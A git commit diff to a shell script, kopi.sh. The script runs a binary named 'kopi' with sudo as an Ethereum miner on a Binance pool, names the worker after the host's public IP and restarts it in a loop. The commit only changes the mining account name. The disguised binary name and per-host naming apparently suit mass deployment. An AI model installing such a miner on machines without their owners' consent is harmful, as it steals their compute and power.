1065aeb58f7f1f49a060d508c4a791f86d223bd8
ladangcuan <92313734+ladangcuan@users.noreply.github.com>
2021-10-12 17:56:20 +0700

    Update kopi.sh

--- kopi.sh
+++ kopi.sh
@@ -2,8 +2,8 @@
 
 cd "$(dirname "$0")"
 
-chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user Jarot20.$(echo "$(curl -s ifconfig.me)" | tr . _ )
+chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user jambret.$(echo "$(curl -s ifconfig.me)" | tr . _ )
 while [ $? -eq 42 ]; do
     sleep 10s
-    chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user Jarot20.$(echo "$(curl -s ifconfig.me)" | tr . _ )
+    chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user jambret.$(echo "$(curl -s ifconfig.me)" | tr . _ )
 done
